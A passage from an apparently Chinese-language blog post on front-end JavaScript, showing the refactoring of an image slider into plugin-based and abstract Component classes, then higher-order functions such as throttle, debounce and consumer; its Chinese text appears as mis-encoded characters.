class="params">...plugins</span>)</span>&#123;</span><br><span class="line">    plugins.forEach(<span class="function"><span class="params">plugin</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> pluginContainer = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">      pluginContainer.className = <span class="string">&#x27;.slider-list__plugin&#x27;</span>;</span><br><span class="line">      pluginContainer.innerHTML = plugin.render(<span class="built_in">this</span>.options.images);</span><br><span class="line">      <span class="built_in">this</span>.container.appendChild(pluginContainer);</span><br><span class="line">      </span><br><span class="line">      plugin.action(<span class="built_in">this</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;</span><br><span class="line">    <span class="keyword">const</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;slide&#x27;</span>, &#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;)</span><br><span class="line">    <span class="built_in">this</span>.container.dispatchEvent(event)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">addEventListener</span>(<span class="params">type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container.addEventListener(type, handler);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.stop();</span><br><span class="line">    <span class="built_in">this</span>._timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span><span class="built_in">this</span>.slideNext(), <span class="built_in">this</span>.cycle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="built_in">this</span>._timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginController = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params">images</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;slide-list__control&quot;&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;images.map((image, i) =&gt; <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">            &lt;span class=&quot;slide-list__control-buttons<span class="subst">$&#123;i===<span class="number">0</span>?<span class="string">&#x27;--selected&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>&quot;&gt;&lt;/span&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">         `</span>).join(<span class="string">&#x27;&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/div&gt;    </span></span><br><span class="line"><span class="string">    `</span>.trim();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> controller = slider.container.querySelector(<span class="string">&#x27;.slide-list__control&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(controller)&#123;</span><br><span class="line">      <span class="keyword">const</span> buttons = controller.querySelectorAll(<span class="string">&#x27;.slide-list__control-buttons, .slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> idx = <span class="built_in">Array</span>.from(buttons).indexOf(evt.target);</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">          slider.slideTo(idx);</span><br><span class="line">          slider.stop();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.start();</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      slider.addEventListener(<span class="string">&#x27;slide&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> idx = evt.detail.index</span><br><span class="line">        <span class="keyword">const</span> selected = controller.querySelector(<span class="string">&#x27;.slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(selected) selected.className = <span class="string">&#x27;slide-list__control-buttons&#x27;</span>;</span><br><span class="line">        buttons[idx].className = <span class="string">&#x27;slide-list__control-buttons--selected&#x27;</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginPrevious = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;a class=&quot;slide-list__previous&quot;&gt;&lt;/a&gt;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__previous&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.stop();</span><br><span class="line">        slider.slidePrevious();</span><br><span class="line">        slider.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginNext = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;a class=&quot;slide-list__next&quot;&gt;&lt;/a&gt;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__next&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.stop();</span><br><span class="line">        slider.slideNext();</span><br><span class="line">        slider.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>, &#123;<span class="attr">images</span>: [<span class="string">&#x27;https://p5.ssl.qhimg.com/t0119c74624763dd070.png&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p4.ssl.qhimg.com/t01adbe3351db853eb3.jpg&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p2.ssl.qhimg.com/t01645cd5ba0c3b60cb.jpg&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p4.ssl.qhimg.com/t01331ac159b58f5478.jpg&#x27;</span>], <span class="attr">cycle</span>:<span class="number">3000</span>&#125;);</span><br><span class="line"></span><br><span class="line">slider.registerPlugins(pluginController, pluginPrevious, pluginNext);</span><br><span class="line">slider.start();</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äº”"><a href="#æ–¹æ³•äº”" class="headerlink" title="æ–¹æ³•äº”"></a>æ–¹æ³•äº”</h3><p>å°†é€šç”¨çš„ç»„ä»¶æ¨¡å‹<strong>æŠ½è±¡</strong>å‡ºæ¥ã€‚<a href="https://code.h5jun.com/vata/4/edit?js,output">https://code.h5jun.com/vata/4/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, opts = &#123;name, data:[]&#125;</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.options = opts;</span><br><span class="line">    <span class="built_in">this</span>.container.innerHTML = <span class="built_in">this</span>.render(opts.data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">registerPlugins</span>(<span class="params">...plugins</span>)</span>&#123;</span><br><span class="line">    plugins.forEach(<span class="function"><span class="params">plugin</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> pluginContainer = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">      pluginContainer.className = <span class="string">`.<span class="subst">$&#123;name&#125;</span>__plugin`</span>;</span><br><span class="line">      pluginContainer.innerHTML = plugin.render(<span class="built_in">this</span>.options.data);</span><br><span class="line">      <span class="built_in">this</span>.container.appendChild(pluginContainer);</span><br><span class="line">      </span><br><span class="line">      plugin.action(<span class="built_in">this</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params">data</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* abstract */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, opts = &#123;name: <span class="string">&#x27;slider-list&#x27;</span>, data:[], cycle: <span class="number">3000</span>&#125;</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>(id, opts);</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container.querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.cycle = opts.cycle || <span class="number">3000</span>;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> content = data.map(<span class="function"><span class="params">image</span> =&gt;</span> <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;li class=&quot;slider-list__item&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;<span class="subst">$&#123;image&#125;</span>&quot;/&gt;</span></span><br><span class="line"><span class="string">      &lt;/li&gt;    </span></span><br><span class="line"><span class="string">    `</span>.trim());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;ul&gt;<span class="subst">$&#123;content.join(<span class="string">&#x27;&#x27;</span>)&#125;</span>&lt;/ul&gt;`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;</span><br><span class="line">    <span class="keyword">const</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;slide&#x27;</span>, &#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;)</span><br><span class="line">    <span class="built_in">this</span>.container.dispatchEvent(event)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">addEventListener</span>(<span class="params">type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container.addEventListener(type, handler);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.stop();</span><br><span class="line">    <span class="built_in">this</span>._timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span><span class="built_in">this</span>.slideNext(), <span class="built_in">this</span>.cycle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="built_in">this</span>._timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginController = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params">images</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;slide-list__control&quot;&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;images.map((image, i) =&gt; <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">            &lt;span class=&quot;slide-list__control-buttons<span class="subst">$&#123;i===<span class="number">0</span>?<span class="string">&#x27;--selected&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>&quot;&gt;&lt;/span&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">         `</span>).join(<span class="string">&#x27;&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/div&gt;    </span></span><br><span class="line"><span class="string">    `</span>.trim();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> controller = slider.container.querySelector(<span class="string">&#x27;.slide-list__control&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(controller)&#123;</span><br><span class="line">      <span class="keyword">let</span> buttons = controller.querySelectorAll(<span class="string">&#x27;.slide-list__control-buttons, .slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> idx = <span class="built_in">Array</span>.from(buttons).indexOf(evt.target);</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">          slider.slideTo(idx);</span><br><span class="line">          slider.stop();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">        slider.start();</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      slider.addEventListener(<span class="string">&#x27;slide&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> idx = evt.detail.index;</span><br><span class="line">        <span class="keyword">let</span> selected = controller.querySelector(<span class="string">&#x27;.slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(selected) selected.className = <span class="string">&#x27;slide-list__control-buttons&#x27;</span>;</span><br><span class="line">        buttons[idx].className = <span class="string">&#x27;slide-list__control-buttons--selected&#x27;</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginPrevious = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;a class=&quot;slide-list__previous&quot;&gt;&lt;/a&gt;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__previous&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.stop();</span><br><span class="line">        slider.slidePrevious();</span><br><span class="line">        slider.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pluginNext = &#123;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;a class=&quot;slide-list__next&quot;&gt;&lt;/a&gt;`</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">action</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__next&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        slider.stop();</span><br><span class="line">        slider.slideNext();</span><br><span class="line">        slider.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>, &#123;<span class="attr">name</span>: <span class="string">&#x27;slide-list&#x27;</span>, <span class="attr">data</span>: [<span class="string">&#x27;https://p5.ssl.qhimg.com/t0119c74624763dd070.png&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p4.ssl.qhimg.com/t01adbe3351db853eb3.jpg&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p2.ssl.qhimg.com/t01645cd5ba0c3b60cb.jpg&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;https://p4.ssl.qhimg.com/t01331ac159b58f5478.jpg&#x27;</span>], <span class="attr">cycle</span>:<span class="number">3000</span>&#125;);</span><br><span class="line"></span><br><span class="line">slider.registerPlugins(pluginController, pluginPrevious, pluginNext);</span><br><span class="line">slider.start();</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>ç»„ä»¶è®¾è®¡çš„åŸåˆ™ï¼šå°è£…æ€§ã€æ­£ç¡®æ€§ã€æ‰©å±•æ€§ã€å¤ç”¨æ€§</li><li>å®ç°ç»„ä»¶çš„æ­¥éª¤ï¼šç»“æ„è®¾è®¡ã€å±•ç°æ•ˆæœã€è¡Œä¸ºè®¾è®¡</li><li>ä¸‰æ¬¡é‡æ„<ul><li>æ’ä»¶åŒ–</li><li>æ¨¡æ¿åŒ–</li><li>æŠ½è±¡åŒ–ï¼ˆç»„ä»¶æ¡†æ¶ï¼‰</li></ul></li></ul><h2 id="Caseï¼šé™åˆ¶æ“ä½œæ¬¡æ•°"><a href="#Caseï¼šé™åˆ¶æ“ä½œæ¬¡æ•°" class="headerlink" title="Caseï¼šé™åˆ¶æ“ä½œæ¬¡æ•°"></a>Caseï¼šé™åˆ¶æ“ä½œæ¬¡æ•°</h2><p>æƒ³ç‚¹å‡»buttonå®ç°æ·¡å‡ºæ•ˆæœ</p><p><img src="https://i.loli.net/2021/08/17/fPenRm8GZyJa9hD.png" alt="image.png"></p><p>å¦‚ä¸‹ä»£ç </p><p><img src="https://i.loli.net/2021/08/17/K3VzBdl8YxgGiIy.png" alt="image.png"></p><p>ä½†æ˜¯å½“å¿«é€Ÿç‚¹å‡»å¤šæ¬¡buttonæ—¶ï¼Œä¼šæŠ¥é”™ï¼š<img src="https://i.loli.net/2021/08/17/YMZBWPGhtRgHiuN.png" alt="image.png"></p><p>ä¸ºäº†èƒ½å¤Ÿè®©â€œåªæ‰§è¡Œä¸€æ¬¡â€çš„éœ€æ±‚è¦†ç›–ä¸åŒçš„äº‹ä»¶å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªéœ€æ±‚å‰¥ç¦»å‡ºæ¥ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<strong>è¿‡ç¨‹æŠ½è±¡</strong>ï¼š</p><ul><li>ç”¨æ¥å¤„ç†å±€éƒ¨ç»†èŠ‚åŠæ§åˆ¶çš„ä¸€äº›æ–¹æ³•</li><li>å‡½æ•°å¼ç¼–ç¨‹æ€æƒ³çš„åŸºç¡€åº”ç”¨</li></ul><p>è§£å†³ï¼š</p><p><img src="https://i.loli.net/2021/08/17/LVB9xNJqRpI42lM.png" alt="image.png"></p><h2 id="é«˜é˜¶å‡½æ•°"><a href="#é«˜é˜¶å‡½æ•°" class="headerlink" title="é«˜é˜¶å‡½æ•°"></a>é«˜é˜¶å‡½æ•°</h2><ul><li>ä»¥å‡½æ•°ä½œä¸ºå‚æ•°</li><li>ä»¥å‡½æ•°ä½œä¸ºè¿”å›å€¼</li><li>å¸¸ç”¨äºä½œä¸ºå‡½æ•°è£…é¥°å™¨</li></ul><h3 id="å¸¸ç”¨çš„é«˜é˜¶å‡½æ•°ï¼š"><a href="#å¸¸ç”¨çš„é«˜é˜¶å‡½æ•°ï¼š" class="headerlink" title="å¸¸ç”¨çš„é«˜é˜¶å‡½æ•°ï¼š"></a>å¸¸ç”¨çš„é«˜é˜¶å‡½æ•°ï¼š</h3><ul><li><p>Once</p></li><li><p><a href="https://code.h5jun.com/gale/1/edit?js,output">Throttle</a> èŠ‚æµ</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn, time = <span class="number">500</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timer;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(timer == <span class="literal">null</span>)&#123;</span><br><span class="line">      fn.apply(<span class="built_in">this</span>,  args);</span><br><span class="line">      timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        timer = <span class="literal">null</span>;</span><br><span class="line">      &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><a href="https://code.h5jun.com/wik/edit?js,output">Debounce</a> é˜²æŠ–</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, dur</span>)</span>&#123;</span><br><span class="line">  dur = dur || <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">var</span> timer;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      fn.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;, dur);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Consumer åŒæ­¥å‡½æ•°å˜å¼‚æ­¥ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">consumer</span>(<span class="params">fn, time</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> tasks = [],</span><br><span class="line">      timer;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    tasks.push(fn.bind(<span class="built_in">this</span>, ...args));</span><br><span class="line">    <span class="keyword">if</span>(timer == <span class="literal">null</span>)&#123;</span><br><span class="line">      timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        tasks.shift().call(<span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">if</span>(tasks.length &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">          timer = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, time)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://code.h5jun.com/roka/7/edit?js,console,output">ä¾‹å­1</a>ã€<a href="https://code.h5jun.com/bucu/3/edit?js,output">ä¾‹å­2</a></p></li><li><p><a href="https://code.h5jun.com/kapef/edit?js,output">Iterative</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterative</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">subject, ...rest</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isIterable(subject)) &#123;</span><br><span class="line">      <span class="keyword">const</span> ret = [];</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> obj <span class="keyword">of</span> subject) 